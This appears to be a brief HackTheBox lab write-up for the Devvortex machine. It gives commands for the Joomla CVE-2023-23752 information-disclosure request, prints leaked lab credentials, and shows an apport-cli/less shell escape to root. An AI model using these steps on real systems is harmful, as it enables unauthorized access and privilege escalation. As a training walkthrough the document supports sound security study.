title: HackTheBox: Devvortex
summary: Exploiting Joomla CVE-2023-23752 to gain initial access, then leveraging MySQL credentials for privilege escalation via apport-cli.

content.text: Starting with an nmap scan to identify open ports and services.

content.code:
nmap -sC -sV -oA nmap/devvortex 10.10.11.242

# Results:
# PORT   STATE SERVICE VERSION
# 22/tcp open  ssh     OpenSSH 8.2p1
# 80/tcp open  http    nginx 1.18.0

content.text: Found a web server running nginx. Let's enumerate subdomains.
The dev subdomain runs Joomla 4.2.6, vulnerable to CVE-2023-23752 (Information Disclosure).

content.code:
curl -s "http://dev.devvortex.htb/api/index.php/v1/config/application?public=true" | jq

# Leaked credentials:
# user: lewis
# password: P4ntherg0t1n5r3c0n##

content.text: After gaining shell access, found MySQL credentials and escalated via apport-cli vulnerability.

content.code:
sudo /usr/bin/apport-cli -c /var/crash/_usr_bin_sleep.1000.crash
# Press 'V' to view report
# In less, type: !/bin/bash
# Got root shell!
